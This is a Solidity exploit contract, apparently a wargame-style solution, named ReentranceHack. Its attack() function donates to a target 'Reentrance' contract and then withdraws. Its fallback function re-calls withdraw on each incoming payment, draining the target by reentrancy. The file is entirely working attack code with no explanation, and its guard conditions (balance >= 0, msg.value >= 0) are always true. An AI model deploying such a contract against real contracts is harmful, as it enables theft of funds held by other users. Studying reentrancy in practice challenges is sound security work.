// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import "./Re-entrancy.sol";

contract ReentranceHack {

    Reentrance public target;

    constructor(address payable _contractaddr) {
        target = Reentrance(_contractaddr);
    }

    fallback() external payable {
      if (address(target).balance >= 0) {
        target.withdraw(0.001 ether);
      }
    }

    function attack() external payable {
      require(msg.value >= 0);
      target.donate{value: 0.001 ether, gas: 40000000}(address(this));
      target.withdraw(0.001 ether);
    }

    function getBalance() public view returns (uint) {
      return address(this).balance;
    }

}



